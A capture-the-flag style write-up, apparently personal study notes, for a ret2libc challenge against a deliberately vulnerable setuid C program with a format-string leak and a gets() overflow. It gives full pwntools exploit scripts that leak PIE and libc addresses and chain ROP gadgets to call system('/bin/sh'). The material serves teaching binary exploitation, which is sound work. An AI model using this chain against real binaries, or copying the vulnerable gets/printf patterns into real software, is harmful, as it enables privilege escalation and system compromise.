```c
#include <stdio.h>

void enter_name(){
    char name[64];
    puts("Please enter your name:");
    fgets(name, sizeof(name), stdin);
    printf("Hello ");
    printf(name);
}

void vuln(){
    char buffer[256];
    gets(buffer);
}

int main()
{
    setuid(0);
    setgid(0);

    enter_name();

    puts("\nGood luck with your ret2libc, you'll never bypass my new PIE protection OR find out where my lib-c library is :P\n");

    vuln();

    return 0;
}
```

```txt
flag{0mG_y0u_l34k3d_p13_4nd_LibC_4nd_r37urn3d_2_Sys73m}
```

```bash
gcc prog.c -o prog -fno-stack-protector
```

We want to be able to leak the `libc` address for this challenge. We can do something like [[Format string vulnerabilities]] to leak the addresses. We'll need to also leak the PIE address if the binary was compiled with PIE enabled. This challenge also has ASLR off.

When PIE is enabled, whenever we debug and disassemble the executable, the address is replaced with an offset to the base address of the executable, so we can't do anything like we did in [[Ret2Win]].

In this challenge, the buffer overflow occurs in the `vuln` function. We know we can do a format string attack to leak addresses from the stack. We want to leak the address of `libc` in this executable. We need to leak the address of the functions that was imported into the executable, which will allow us to figure out the base address of the `libc` library.

In the `enter_name` function, we'll try to leak some values here. We'll try to leak something which will allow us to calculate the PIE base address. We can actually calculate the PIE base using the the `piebase` command from `pwndbg`. We can also use `breakrva` to set a breakpoint at the PIE base. With the base address, we can now calculate the exact address of any functions in the executable by adding the base address with the function's offset. We can use `breakrva 0x1111` to set a breakpoint at the function specified by the offset `0x1111`, which will show us the actual address of the function based on the current PIE base.

> Note: This is actually quite useful if the binary was stripped.

After testing, when the program crashed, the top value of the stack (what was about to be placed into the `rip` for executing) was the 265th-272nd byte. So we'll need 264 bytes of padding for the buffer overflow in the `vuln` function.

Now we try to leak the addresses from the stack to find the address of the `puts` function.

```python
for i in range(100):
    try:
        p = start()
        
        # Format the counter to print pointer value
        p.sendlineafter(b':', '%{}$p'.format(i).encode())
        
        # Receive the response
        p.recvuntil(b'Hello ')
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        
        p.close()
    except EOFError:
        pass
```

Addresses that could potentially be useful are addresses that stays the same each time we run the script and addresses that won't fall out of the range of useful addresses (so stuff like `0x7fffff...` are outside of the binary). Then we can put the value into a debugger and check out what function that is, we could also calculate the offset of that function relative to the base address.

Now we can construct the first part of the attack: Getting the address of the `pop rdi` gadget. We'll calculate the PIE base address by getting the 15th address from the stack and subtract that with `0x1224` (which we got from analyzing the GDB because the 15th address is the `main+44` so we check the offset for `main+44`). Then we'll add the PIE base address with the `pop rdi` gadget offset, which will give us the exact address of `pop rdi`.

```python
# Offset to RIP
offset = 264

# Start program
io = start()

# Offset of pop_rdi gadget from ropper
# We need to find the PIEBASE before we can use
pop_rdi_offset = 0x12ab

# Leak 15th address from stack (main+44)
io.sendlineafter(b':', '%{}$p'.format(15))
io.recvuntil(b'Hello ')  # Address will follow
leaked_addr = int(io.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

# Now calculate the PIEBASE
elf.address = leaked_addr - 0x1224 # Setup the base address for easy scripting
info("piebase: %#x", elf.address)

# Update pop_rdi gadget
pop_rdi = elf.address + pop_rdi_offset
```

Now that we have the `pop rdi` gadget's address, we can perform a buffer overflow. So we want to pad with 264 bytes first, put the `puts` function's address into the `rdi` register and put it out into the screen using `puts`, then set the return address to the `vuln` function because we want have another payload to send. The constructed payload will be sent into the `vuln` function.

```python
# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,  # Pop got.puts into RDI
        elf.got.puts,
        elf.plt.puts,  # Call puts() to leak the got.puts address
        elf.symbols.vuln  # Return to vuln (to overflow buffer with another payload)
    ]
})

# Send the payload
io.sendlineafter(b':P', payload)

io.recvlines(2)  # Blank line
```

After sending the payload, we can retrieve the `puts` function address and subtract the offset of `puts` with the received address of `puts` to get the `libc` base address. Now that we have the base address of `libc`, we can get the address to `system` and `/bin/sh` by adding the base address with the offset.

> Note: `plt` is the `got`'s procedure linkage table.

```python
# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
libc_base = got_puts - 0x765f0
info("libc_base: %#x", libc_base)

# Add offsets to get system() and "/bin/sh" addresses
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
system_addr = libc_base + 0x48e50
info("system_addr: %#x", system_addr)

# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
bin_sh = libc_base + 0x18a152
info("bin_sh: %#x", bin_sh)
```

After getting the address of `system` and `/bin/sh`, we can construct another payload to send to `vuln` (because the last payload put us back into `vuln`). The payload will first pad the payload, then load the `/bin/sh` string into the `rdi` register, then call the `system` function.

```python
# Payload to get shell: system('/bin/sh')
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        system_addr
    ]
})

# Send the payload
io.sendline(payload)

# Got shell
io.interactive()
```

To recap, the exploit will first try to calculate the PIE base address of the executable by exploiting the format string vulnerability in the `enter_name` function, then it will use that base address to figure out the `pop rdi` gadget's address.

Then we leak the `libc` base address by calculating the exact address of the function `puts`, which was used in `vuln`. We do this by doing a buffer overflow in the `vuln` function. We pad the payload with 264 bytes, then pass the `puts` address specified by the GOT table into the `rdi` by using the `pop rdi` gadget that we got from the first part. We then call the `puts` method to print out the value in `rdi` out into the screen, then set the return address to return back to `vuln` for the next part. Now that we have the exact address of `puts`, we can get the offset of the `puts` function relative to the base address of `libc` in the `libc` library by using commands like `readelf`. Then subtract the absolute address of `puts` with the offset of `puts` and get the `libc` base address.

With the `libc` base address, we can now get the exact address of the `system` function and `/bin/sh` string in `libc` by adding it with the offset that we got from `readelf` and `string`. This will give us the exact address of `system` and `/bin/sh`.

With the exact address of the necessary functions and strings, we can perform the get shell attack. Because our previous payload to grab the `libc` base address put us back into the `vuln` function, we can construct another payload and send it into `vuln`. So we firstly pad the payload with 264 bytes, then pass in the `pop rdi` gadget to pop the `/bin/sh` into the `rdi` register. Then we call the `system` function.

Here's a script that completely automate this process:

```python
# Lib-C library
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local

# Offset to RIP
offset = 264

# Start program
io = start()

# Offset of pop_rdi gadget from ropper
# We need to find the PIEBASE before we can use
pop_rdi_offset = 0x12ab

# Leak 15th address from stack (main+44)
io.sendlineafter(b':', '%{}$p'.format(15), 16)
io.recvuntil(b'Hello ')  # Address will follow
leaked_addr = int(io.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

# Now calculate the PIEBASE
elf.address = leaked_addr - 0x1224
info("piebase: %#x", elf.address)

# Update pop_rdi gadget
pop_rdi = elf.address + pop_rdi_offset

# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,  # Pop got.puts into RDI
        elf.got.puts,
        elf.plt.puts,  # Call puts() to leak the got.puts address
        elf.symbols.vuln  # Return to vuln (to overflow buffer with another payload)
    ]
})

# Send the payload
io.sendlineafter(b':P', payload)

io.recvlines(2)  # Blank line

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Payload to get shell: system('/bin/sh')
payload = flat({
    offset: [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.symbols.system
    ]
})

# Send the payload
io.sendline(payload)

# Got shell
io.interactive()
```

> If you don't know what `libc` version the server is running in, you can reference a [libc database](https://libc.blukat.me/).